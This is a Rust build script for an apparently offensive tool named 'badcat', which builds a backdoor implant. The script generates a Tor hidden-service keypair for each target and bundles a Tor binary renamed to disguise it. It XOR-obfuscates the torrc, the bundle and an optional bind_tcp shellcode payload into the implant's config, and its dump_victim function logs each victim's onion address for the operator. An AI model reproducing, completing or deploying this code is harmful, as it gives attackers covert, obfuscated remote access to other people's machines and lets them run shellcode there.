use std::path::{Path, PathBuf};
use std::{collections, error, fs, process};

use badcat_lib::{http, xor};
use hex::FromHex;

const CFG_TEMPLATE: &str = "config.rs.template";
const CFG_DESTINATION: &str = "src/config.rs";
const CFG_SETTINGS: &str = "settings.json";

struct BuildSetting {
    /// Name to identify the host when connecting to it later
    name: String,

    /// Which file to save information about
    hosts_file: PathBuf,

    /// Whether or not the target is a Windows NT machine
    is_tor_for_windows: bool,

    /// XOR encryption key
    key: String,

    /// Download url for windows
    windows_url: String,

    /// Destination directory for windows
    windows_dir: String,

    /// Download url for linux
    linux_url: String,

    /// Destination directory for linux
    linux_dir: String,

    /// Torrc file to bundle
    torrc_file: String,

    /// Executable name of tor in target machine
    tor_executable: String,
    
    /// Whether or not to use shellcode like payload
    uses_payload: bool,

    /// Payload to execute. The supported payload is bind_tcp ones
    payload_data: String,

    /// If using a bind_tcp payload, what port the payload will listen
    payload_port: String,
}

fn main() -> Result<(), Box<dyn error::Error>> {
    let raw_settings: json::JsonValue = load_settings()?;

    let setting = parse_settings(&raw_settings);
    println!("cargo:rerun-if-changed={}", CFG_SETTINGS);

    let mut torrc = fs::read_to_string(&setting.torrc_file)?;

    let platform_tor_dir;

    if setting.is_tor_for_windows {
        platform_tor_dir = &setting.windows_dir;
    } else {
        platform_tor_dir = &setting.linux_dir;

        torrc += r#"
ControlSocketsGroupWritable 1
ControlSocket @{CTRL_SOCKET}
"#;
    }

    let tor_dir = Path::new(&platform_tor_dir).join(&setting.tor_executable).join("App");

    let mut replacements = collections::HashMap::new();

    replacements.insert("@{NAME}", setting.tor_executable.clone());
    replacements.insert("@{ENC_KEY}", setting.key.clone());

    let enc_tor_dir = xor::encode(&setting.key, &String::from(tor_dir.to_str().unwrap()));
    replacements.insert("@{ENC_TOR_DIR}", enc_tor_dir);

    let enc_torrc = xor::encode(&setting.key, &torrc);
    replacements.insert("@{ENC_TORRC}", enc_torrc);

    replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);

    let enc_payload_data = if setting.uses_payload {
        if &setting.payload_port == "" {
            return Err(String::from("payload port is required").into());
        }

        let bytes: Vec<u8> = Vec::from_hex(&setting.payload_data)?;
        xor::encode_bytes(&setting.key, &bytes)
    } else {
        String::from("")
    };

    replacements.insert("@{ENC_PAYLOAD_DATA}", enc_payload_data);
    replacements.insert("@{PAYLOAD_PORT}", setting.payload_port);

    replace_settings(CFG_TEMPLATE, CFG_DESTINATION, &replacements)?;

    Ok(())
}

fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
    let url = if setting.is_tor_for_windows {
        &setting.windows_url
    } else {
        &setting.linux_url
    };

    let tmp_dir;

    if url.starts_with("file://") {
        let local_dir = url.strip_prefix("file://").unwrap();

        println!("cargo:rerun-if-changed={}", &local_dir);

        tmp_dir = tempfile::tempdir()?;

        badcat_lib::fs::copy_dir(&PathBuf::from(local_dir), &tmp_dir.path().to_path_buf())?;
    } else {
        tmp_dir = download_and_extract_tor(&url, setting)?;
    }

    let dir = tmp_dir.path().to_str().unwrap();
    let hs_addr = generate_hs_secrets(dir)?;

    dump_victim(hs_addr, &setting)?;

    let mut archive = tar::Builder::new(Vec::new());
    archive.append_dir_all(&setting.tor_executable, &dir)?;

    let data = archive.into_inner()?;

    let bundle = xor::encode_bytes(&setting.key, &data);
    Ok(bundle)
}

fn dump_victim(address: String, setting: &BuildSetting) -> Result<(), Box<dyn error::Error>> {
    let mut hosts = match fs::read_to_string(&setting.hosts_file) {
        Ok(data) => json::parse(&data).expect(&format!("failed to read json at {}", &setting.hosts_file.to_str().unwrap())),
        Err(_) => json::JsonValue::new_array(),
    };

    let mut host = json::JsonValue::new_object();
    host["address"] = address.into();
    host["uses_payload"] = setting.uses_payload.into();
    host["name"] = setting.name.clone().into();

    hosts.push(host)?;
    fs::write(&setting.hosts_file, hosts.pretty(4))?;

    Ok(())
}

fn generate_hs_secrets(to_dir: &str) -> Result<String, Box<dyn error::Error>> {
    let temp_dir = tempfile::tempdir()?;

    let proc = process::Command::new("mkp224o")
        .args([
            "-n",
            "1",
            "-d",
            temp_dir.path().to_str().unwrap(),
            "-q",
            "a",
        ])
        .output()?;

    if !proc.status.success() {
        println!("{}", String::from_utf8(proc.stderr)?);
        return Err(String::from("problem generating hidden service keys").into());
    }

    let output = String::from_utf8(proc.stdout)?;
    let hs_addr = output.strip_suffix("\n").unwrap();

    // mkp224o stores the files with this structure
    let secrets_dir = temp_dir.path().join(hs_addr);

    let dir = Path::new(to_dir).join("App");

    fs::copy(secrets_dir.join("hostname"), dir.join("hostname"))?;
    fs::copy(
        secrets_dir.join("hs_ed25519_public_key"),
        dir.join("hs_ed25519_public_key"),
    )?;
    fs::copy(
        secrets_dir.join("hs_ed25519_secret_key"),
        dir.join("hs_ed25519_secret_key"),
    )?;

    Ok(String::from(hs_addr))
}

fn download_and_extract_tor(
    url: &String,
    setting: &BuildSetting,
) -> Result<tempfile::TempDir, Box<dyn error::Error>> {
    let file = tempfile::NamedTempFile::new()?;

    http::download(url, &mut file.reopen()?)?;

    let dir = tempfile::tempdir()?;
    let path = dir.path().to_owned();

    if setting.is_tor_for_windows {
        let mut zip = zip::ZipArchive::new(file)?;
        zip.extract(&dir)?;

        fs::rename(path.join("Tor"), path.join("App"))?;

        fs::rename(
            path.join("App").join("tor.exe"),
            path.join("App").join(format!("{}.exe", &setting.tor_executable)),
        )?;

        fs::rename(
            path.join("App").join("tor-gencert.exe"),
            path.join("App").join("util.exe"),
        )?;

        fs::remove_dir_all(path.join("Data"))?;
    } else {
        let status = process::Command::new("tar")
            .args(["-xf", file.path().to_str().unwrap()])
            .current_dir(&dir)
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem extracting archive").into());
        }
    }

    Ok(dir)
}

fn load_settings() -> Result<json::JsonValue, Box<dyn error::Error>> {
    let source = fs::read_to_string(CFG_SETTINGS).expect("failed to read settings");
    Ok(json::parse(&source)?)
}

fn replace_settings(
    template: &str,
    destinaion: &str,
    replacements: &collections::HashMap<&str, String>,
) -> Result<(), Box<dyn error::Error>> {
    let mut config_source = fs::read_to_string(template)?;

    for (pattern, content) in replacements {
        config_source = config_source.replace(pattern, &content);
    }

    fs::write(destinaion, config_source)?;

    Ok(())
}

fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
    let name = String::from(raw["name"].as_str().unwrap_or_else(|| {
        panic!("invalid name setting");
    }));

    let hosts_file = PathBuf::from(raw["hosts_file"].as_str().unwrap_or_else(|| {
        panic!("invalid hosts_file setting");
    }));

    let key = if raw.has_key("key") {
        String::from(raw["key"].as_str().unwrap_or_else(|| {
            panic!("key must be a string");
        }))
    } else {
        xor::secret_key()
    };

    let is_tor_for_windows = raw["tor"]["build_for_windows"].as_bool().unwrap_or(false);

    let windows_url = String::from(raw["tor"]["download_url"]["windows"].as_str().unwrap_or_else(|| {
        panic!("invalid windows download url");
    }));

    let linux_url = String::from(raw["tor"]["download_url"]["linux"].as_str().unwrap_or_else(|| {
        panic!("invalid linux download url");
    }));

    let windows_dir = String::from(raw["tor"]["destination_dir"]["windows"].as_str().unwrap_or_else(|| {
        panic!("invalid windows download directory");
    }));

    let linux_dir = String::from(raw["tor"]["destination_dir"]["linux"].as_str().unwrap_or_else(|| {
        panic!("invalid linux destination directory");
    }));

    let torrc_file = String::from(raw["tor"]["rc_file"].as_str().unwrap_or_else(|| {
        panic!("invalid torrc file");
    }));

    let tor_executable = String::from(raw["tor"]["executable"].as_str().unwrap_or_else(|| {
        panic!("invalid tor executable name");
    }));

    let uses_payload = raw["payload"]["enabled"].as_bool().unwrap_or(false);

    let payload_data = if uses_payload {
        String::from(raw["payload"]["hex"].as_str().unwrap_or_else(|| {
            panic!("invalid payload setting")
        }))
    } else {
        String::from("")
    };

    let payload_port = String::from(raw["payload"]["bind_port"].as_str().unwrap_or(""));

    BuildSetting {
        name,
        hosts_file,
        is_tor_for_windows,
        key,
        windows_url,
        windows_dir,
        linux_url,
        linux_dir,
        torrc_file,
        tor_executable,
        uses_payload,
        payload_data,
        payload_port,
    }
}
